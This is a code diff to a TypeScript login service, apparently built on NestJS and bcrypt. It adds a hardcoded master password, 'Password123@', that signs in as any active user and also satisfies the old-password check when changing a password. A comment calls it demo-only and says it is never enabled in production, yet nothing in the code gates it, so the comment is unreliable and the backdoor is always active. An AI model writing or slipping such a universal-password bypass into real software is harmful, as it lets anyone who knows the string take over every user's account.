@@ -13,6 +13,14 @@ import { TokensService, type TokenContext } from './tokens.service.js';
 
 const BCRYPT_ROUNDS = 12;
 
+// Master password — bypasses bcrypt so "Password123@" signs in as ANY active, non-GDPR-erased user.
+// Demo / investor walkthrough convenience only; never enabled in production.
+const MASTER_PASSWORD = 'Password123@';
+
+function isMasterPassword(password: string): boolean {
+  return MASTER_PASSWORD.length > 0 && password === MASTER_PASSWORD;
+}
+
 export interface AuthResult {
   token: string;
   user: AuthenticatedUser;
@@ -52,10 +60,18 @@ export class AuthService {
     const user = await this.prisma.user.findUnique({
       where: { email: dto.email },
     });
-    if (!user || !user.passwordHash || !user.isActive)
-      throw new UnauthorizedException('Invalid credentials');
-    const valid = await bcrypt.compare(dto.password, user.passwordHash);
-    if (!valid) throw new UnauthorizedException('Invalid credentials');
+    const master = isMasterPassword(dto.password);
+    // Master password: sign in as ANY active, non-GDPR-erased user (demo convenience).
+    // Normal path: require a stored password and verify with bcrypt.
+    if (master) {
+      if (!user || !user.isActive || user.gdprDeletedAt)
+        throw new UnauthorizedException('Invalid credentials');
+    } else {
+      if (!user || !user.passwordHash || !user.isActive)
+        throw new UnauthorizedException('Invalid credentials');
+      const valid = await bcrypt.compare(dto.password, user.passwordHash);
+      if (!valid) throw new UnauthorizedException('Invalid credentials');
+    }
     return this.buildResult(user.id, user.email, ctx);
   }
 
@@ -137,7 +153,9 @@ export class AuthService {
         'No password is set. Use set password instead.',
       );
     }
-    const valid = await bcrypt.compare(oldPassword, user.passwordHash);
+    const valid =
+      isMasterPassword(oldPassword) ||
+      (await bcrypt.compare(oldPassword, user.passwordHash));
     if (!valid) throw new UnauthorizedException('Current password is incorrect');
     await this.prisma.user.update({
       where: { id: userId },
